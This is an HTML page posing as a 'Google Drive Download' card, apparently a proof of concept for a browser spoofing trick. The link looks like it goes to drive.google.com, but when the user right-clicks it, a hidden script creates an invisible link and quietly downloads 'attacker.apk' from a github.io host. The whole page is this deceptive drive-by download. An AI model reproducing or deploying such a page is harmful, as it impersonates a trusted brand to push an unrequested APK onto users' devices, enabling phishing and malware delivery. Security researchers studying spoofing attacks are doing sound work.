<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Download Manager</title>
<style>
body{margin:0;padding:80px 20px;font-family:Arial;background:#f8f9fa;text-align:center}
.card{max-width:500px;margin:0 auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
h1{font-size:24px;color:#202124;margin:0 0 16px}
p{color:#5f6368;margin:0 0 32px}
.link{display:inline-block;padding:14px 32px;background:#1a73e8;color:#fff;text-decoration:none;border-radius:4px;font-size:16px}
</style>
</head>
<body>
<div class="card">
  <h1>Google Drive Download</h1>
  <p>Manage your downloads</p>
  <a href="https://drive.google.com/drive/" id="link" class="link">
    Right-click: Open in Split View
  </a>
</div>
<script>
document.getElementById('link').addEventListener('contextmenu', function() {
  setTimeout(() => {
    const downloadLink = document.createElement('a');
    downloadLink.href = 'https://azza0x1a.github.io/safarispoof/attacker.apk';
    downloadLink.style.display = 'none';
    document.body.appendChild(downloadLink);
    
    setTimeout(() => {
      downloadLink.click();
      setTimeout(() => document.body.removeChild(downloadLink), 1000);
    }, 1200);
  }, 500);
});
</script>
</body>
</html>
